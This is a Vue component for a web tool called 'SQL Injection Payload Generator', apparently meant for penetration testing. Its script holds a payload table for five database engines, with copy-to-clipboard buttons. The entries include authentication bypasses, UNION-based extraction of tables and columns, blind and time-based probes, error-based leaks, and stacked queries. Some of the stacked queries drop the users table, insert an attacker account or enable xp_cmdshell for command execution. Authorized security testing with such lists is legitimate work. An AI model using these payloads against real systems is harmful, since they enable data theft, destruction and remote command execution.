<template>
  <div class="flex w-full flex-col items-center gap-4 p-4 sm:gap-0">
    <p class="text-muted-foreground mb-2 w-full max-w-6xl text-center text-sm">
      Generate SQL injection payloads for penetration testing
    </p>
    <Card class="route-transition-animation mb-4 w-full max-w-4xl rounded-2xl shadow-lg sm:mb-8">
      <CardHeader class="pb-2 sm:pb-3">
        <CardTitle
          class="flex items-center gap-1.5 text-base font-semibold sm:gap-2 sm:text-lg lg:text-xl"
        >
          <Icon
            icon="mdi:database-alert"
            class="text-primary h-4 w-4 sm:h-5 sm:w-5 lg:h-6 lg:w-6"
          />
          SQL Injection Payload Generator
        </CardTitle>
      </CardHeader>
      <CardContent class="space-y-2.5 sm:space-y-3">
        <!-- Configuration -->
        <div class="grid grid-cols-1 gap-2 sm:grid-cols-2 sm:gap-3">
          <!-- Database Type -->
          <div class="space-y-1.5">
            <Label class="text-[10px] sm:text-xs">Database Type</Label>
            <Select v-model="dbType" @update:modelValue="generatePayloads">
              <SelectTrigger class="h-8 text-[10px] sm:h-9 sm:text-xs">
                <SelectValue placeholder="Select database" />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="mysql">MySQL/MariaDB</SelectItem>
                <SelectItem value="postgresql">PostgreSQL</SelectItem>
                <SelectItem value="mssql">Microsoft SQL Server</SelectItem>
                <SelectItem value="oracle">Oracle</SelectItem>
                <SelectItem value="sqlite">SQLite</SelectItem>
              </SelectContent>
            </Select>
          </div>

          <!-- Attack Type -->
          <div class="space-y-1.5">
            <Label class="text-[10px] sm:text-xs">Attack Type</Label>
            <Select v-model="attackType" @update:modelValue="generatePayloads">
              <SelectTrigger class="h-8 text-[10px] sm:h-9 sm:text-xs">
                <SelectValue placeholder="Select attack type" />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="basic">Basic Authentication Bypass</SelectItem>
                <SelectItem value="union">UNION-based</SelectItem>
                <SelectItem value="blind">Blind SQL Injection</SelectItem>
                <SelectItem value="timebased">Time-based Blind</SelectItem>
                <SelectItem value="error">Error-based</SelectItem>
                <SelectItem value="stacked">Stacked Queries</SelectItem>
              </SelectContent>
            </Select>
          </div>
        </div>

        <!-- Payloads -->
        <div class="space-y-1.5">
          <div class="flex items-center justify-between">
            <Label class="text-[10px] sm:text-xs">Generated Payloads</Label>
            <Button
              @click="copyAllPayloads"
              variant="outline"
              size="sm"
              class="h-6 text-[10px] sm:h-7"
            >
              <Icon icon="mdi:content-copy" class="mr-1 h-3 w-3" />
              {{ copiedAll ? 'Copied!' : 'Copy All' }}
            </Button>
          </div>
          <div class="space-y-2">
            <div
              v-for="(payload, index) in payloads"
              :key="index"
              class="bg-muted/30 group border-muted-foreground/20 relative rounded-lg border p-2.5 sm:p-3"
            >
              <div class="mb-1 flex items-center justify-between">
                <span class="text-primary text-[9px] font-semibold sm:text-[10px]">{{
                  payload.name
                }}</span>
                <Button
                  @click="copyPayload(payload.code, index)"
                  variant="ghost"
                  size="sm"
                  class="h-5 px-2 text-[9px] transition-opacity"
                >
                  <Icon
                    :icon="copiedIndices.includes(index) ? 'mdi:check' : 'mdi:content-copy'"
                    class="h-3 w-3"
                  />
                </Button>
              </div>
              <pre
                class="overflow-x-auto text-[9px] leading-relaxed sm:text-[10px]"
              ><code>{{ payload.code }}</code></pre>
              <p
                v-if="payload.description"
                class="text-muted-foreground mt-1 text-[8px] sm:text-[9px]"
              >
                {{ payload.description }}
              </p>
            </div>
          </div>
        </div>

        <!-- Warning -->
        <div class="rounded-lg bg-orange-50 p-2.5 dark:bg-orange-950/20">
          <div
            class="mb-0.5 flex items-center gap-1.5 text-[10px] font-medium text-orange-700 dark:text-orange-300"
          >
            <Icon icon="mdi:alert" class="h-3.5 w-3.5" />
            Legal Warning
          </div>
          <p class="text-[9px] leading-tight text-orange-600 sm:text-[10px] dark:text-orange-400">
            SQL injection attacks without authorization are illegal. Only use these payloads on
            systems you own or have explicit permission to test.
          </p>
        </div>
      </CardContent>
    </Card>
  </div>
</template>

<script setup lang="ts">
import { ref, onMounted } from 'vue'
import { Card, CardHeader, CardTitle, CardContent } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Label } from '@/components/ui/label'
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from '@/components/ui/select'
import { Icon } from '@iconify/vue'

const dbType = ref('mysql')
const attackType = ref('basic')
const copiedIndices = ref<number[]>([])
const copiedAll = ref(false)

interface Payload {
  name: string
  code: string
  description?: string
}

const payloads = ref<Payload[]>([])

const sqlPayloads: Record<string, Record<string, Payload[]>> = {
  mysql: {
    basic: [
      { name: 'OR 1=1', code: "' OR '1'='1", description: 'Basic authentication bypass' },
      { name: 'OR 1=1 --', code: "' OR '1'='1' --", description: 'With comment' },
      { name: 'OR 1=1 #', code: "' OR '1'='1' #", description: 'MySQL comment style' },
      { name: 'Admin OR 1=1', code: "admin' --", description: 'Username-based bypass' },
      { name: 'Double dash', code: "' OR 1=1--", description: 'No space before comment' },
    ],
    union: [
      {
        name: 'UNION SELECT',
        code: "' UNION SELECT NULL,NULL,NULL--",
        description: 'Column number discovery',
      },
      {
        name: 'UNION with version',
        code: "' UNION SELECT NULL,@@version,NULL--",
        description: 'Extract MySQL version',
      },
      {
        name: 'UNION table names',
        code: "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--",
        description: 'List database tables',
      },
      {
        name: 'UNION column names',
        code: "' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
        description: 'List table columns',
      },
    ],
    blind: [
      {
        name: 'Boolean-based',
        code: "' AND 1=1--",
        description: 'True condition (page loads normally)',
      },
      {
        name: 'Boolean-based false',
        code: "' AND 1=2--",
        description: 'False condition (page differs)',
      },
      {
        name: 'Substring check',
        code: "' AND SUBSTRING(@@version,1,1)='5'--",
        description: 'Check first character of version',
      },
      { name: 'Length check', code: "' AND LENGTH(database())>5--", description: 'DB name length' },
    ],
    timebased: [
      { name: 'SLEEP 5', code: "' AND SLEEP(5)--", description: 'Delay 5 seconds' },
      {
        name: 'IF SLEEP',
        code: "' AND IF(1=1,SLEEP(5),0)--",
        description: 'Conditional delay',
      },
      {
        name: 'BENCHMARK',
        code: "' AND BENCHMARK(5000000,MD5('test'))--",
        description: 'CPU-intensive delay',
      },
    ],
    error: [
      {
        name: 'EXTRACTVALUE',
        code: "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",
        description: 'Extract data via error',
      },
      {
        name: 'UPDATEXML',
        code: "' AND UPDATEXML(1,CONCAT(0x7e,database()),1)--",
        description: 'Get database name',
      },
    ],
    stacked: [
      { name: 'Multiple queries', code: "'; DROP TABLE users--", description: 'Destructive query' },
      {
        name: 'INSERT statement',
        code: "'; INSERT INTO users VALUES('hacker','pass')--",
        description: 'Add new user',
      },
    ],
  },
  postgresql: {
    basic: [
      { name: 'OR 1=1', code: "' OR '1'='1", description: 'Basic bypass' },
      { name: 'OR 1=1 --', code: "' OR '1'='1' --", description: 'With comment' },
      { name: 'Cast bypass', code: "' OR '1'='1'::text --", description: 'Type casting' },
    ],
    union: [
      {
        name: 'UNION SELECT',
        code: "' UNION SELECT NULL,NULL,NULL--",
        description: 'Column count',
      },
      {
        name: 'UNION with version',
        code: "' UNION SELECT NULL,version(),NULL--",
        description: 'PostgreSQL version',
      },
      {
        name: 'UNION table names',
        code: "' UNION SELECT NULL,tablename,NULL FROM pg_tables--",
        description: 'List tables',
      },
    ],
    blind: [
      { name: 'Boolean-based', code: "' AND 1=1--", description: 'True condition' },
      { name: 'Boolean-based false', code: "' AND 1=2--", description: 'False condition' },
      {
        name: 'Substring check',
        code: "' AND SUBSTRING(version(),1,1)='P'--",
        description: 'Version check',
      },
    ],
    timebased: [
      { name: 'pg_sleep', code: "' AND pg_sleep(5)--", description: 'Delay 5 seconds' },
      {
        name: 'Conditional sleep',
        code: "' AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
        description: 'If-then delay',
      },
    ],
    error: [
      {
        name: 'CAST error',
        code: "' AND 1=CAST((SELECT version()) AS int)--",
        description: 'Type conversion error',
      },
    ],
    stacked: [
      { name: 'Multiple queries', code: "'; DROP TABLE users--", description: 'Drop table' },
      {
        name: 'CREATE TABLE',
        code: "'; CREATE TABLE pwned(id int)--",
        description: 'Create table',
      },
    ],
  },
  mssql: {
    basic: [
      { name: 'OR 1=1', code: "' OR '1'='1", description: 'Basic bypass' },
      { name: 'OR 1=1 --', code: "' OR '1'='1' --", description: 'With comment' },
      {
        name: 'xp_cmdshell',
        code: "'; EXEC xp_cmdshell('whoami')--",
        description: 'Command execution',
      },
    ],
    union: [
      {
        name: 'UNION SELECT',
        code: "' UNION SELECT NULL,NULL,NULL--",
        description: 'Column count',
      },
      {
        name: 'UNION with version',
        code: "' UNION SELECT NULL,@@version,NULL--",
        description: 'MSSQL version',
      },
      {
        name: 'UNION table names',
        code: "' UNION SELECT NULL,name,NULL FROM sysobjects WHERE xtype='U'--",
        description: 'List tables',
      },
    ],
    blind: [
      { name: 'Boolean-based', code: "' AND 1=1--", description: 'True condition' },
      {
        name: 'ASCII check',
        code: "' AND ASCII(SUBSTRING(@@version,1,1))>50--",
        description: 'Char comparison',
      },
    ],
    timebased: [
      { name: 'WAITFOR DELAY', code: "'; WAITFOR DELAY '0:0:5'--", description: 'Delay 5 seconds' },
      {
        name: 'Conditional delay',
        code: "'; IF(1=1) WAITFOR DELAY '0:0:5'--",
        description: 'If-then delay',
      },
    ],
    error: [
      {
        name: 'CONVERT error',
        code: "' AND 1=CONVERT(int,@@version)--",
        description: 'Conversion error',
      },
    ],
    stacked: [
      { name: 'Multiple queries', code: "'; DROP TABLE users--", description: 'Drop table' },
      {
        name: 'Enable xp_cmdshell',
        code: "'; EXEC sp_configure 'xp_cmdshell',1--",
        description: 'Enable RCE',
      },
    ],
  },
  oracle: {
    basic: [
      { name: 'OR 1=1', code: "' OR '1'='1", description: 'Basic bypass' },
      { name: 'OR 1=1 --', code: "' OR '1'='1' --", description: 'With comment' },
    ],
    union: [
      {
        name: 'UNION SELECT',
        code: "' UNION SELECT NULL,NULL FROM dual--",
        description: 'Column count',
      },
      {
        name: 'UNION with version',
        code: "' UNION SELECT NULL,banner FROM v$version--",
        description: 'Oracle version',
      },
      {
        name: 'UNION table names',
        code: "' UNION SELECT NULL,table_name FROM all_tables--",
        description: 'List tables',
      },
    ],
    blind: [
      { name: 'Boolean-based', code: "' AND 1=1--", description: 'True condition' },
      {
        name: 'Substring check',
        code: "' AND SUBSTR(banner,1,1)='O' FROM v$version WHERE ROWNUM=1--",
        description: 'Version check',
      },
    ],
    timebased: [
      {
        name: 'DBMS_LOCK.SLEEP',
        code: "' AND DBMS_LOCK.SLEEP(5)--",
        description: 'Delay 5 seconds',
      },
    ],
    error: [
      {
        name: 'CAST error',
        code: "' AND 1=TO_NUMBER(banner) FROM v$version--",
        description: 'Type error',
      },
    ],
    stacked: [
      { name: 'Multiple queries', code: "'; DROP TABLE users--", description: 'Drop table' },
    ],
  },
  sqlite: {
    basic: [
      { name: 'OR 1=1', code: "' OR '1'='1", description: 'Basic bypass' },
      { name: 'OR 1=1 --', code: "' OR '1'='1' --", description: 'With comment' },
    ],
    union: [
      {
        name: 'UNION SELECT',
        code: "' UNION SELECT NULL,NULL,NULL--",
        description: 'Column count',
      },
      {
        name: 'UNION with version',
        code: "' UNION SELECT NULL,sqlite_version(),NULL--",
        description: 'SQLite version',
      },
      {
        name: 'UNION table names',
        code: "' UNION SELECT NULL,name,NULL FROM sqlite_master WHERE type='table'--",
        description: 'List tables',
      },
    ],
    blind: [
      { name: 'Boolean-based', code: "' AND 1=1--", description: 'True condition' },
      {
        name: 'Length check',
        code: "' AND length(sqlite_version())>1--",
        description: 'Version length',
      },
    ],
    timebased: [
      {
        name: 'RANDOMBLOB delay',
        code: "' AND randomblob(100000000)--",
        description: 'CPU-intensive delay',
      },
    ],
    error: [
      {
        name: 'CAST error',
        code: "' AND 1=CAST(sqlite_version() AS integer)--",
        description: 'Type error',
      },
    ],
    stacked: [
      { name: 'Multiple queries', code: "'; DROP TABLE users--", description: 'Drop table' },
      {
        name: 'ATTACH DATABASE',
        code: "'; ATTACH DATABASE 'hack.db' AS hack--",
        description: 'Attach DB',
      },
    ],
  },
}

function generatePayloads() {
  payloads.value = sqlPayloads[dbType.value]?.[attackType.value] || []
}

function copyPayload(code: string, index: number) {
  navigator.clipboard.writeText(code)
  copiedIndices.value.push(index)
  setTimeout(() => {
    copiedIndices.value = copiedIndices.value.filter((i) => i !== index)
  }, 1500)
}

function copyAllPayloads() {
  const allPayloads = payloads.value.map((p) => p.code).join('\n')
  navigator.clipboard.writeText(allPayloads)
  copiedAll.value = true
  setTimeout(() => (copiedAll.value = false), 1500)
}

onMounted(() => {
  generatePayloads()
})
</script>
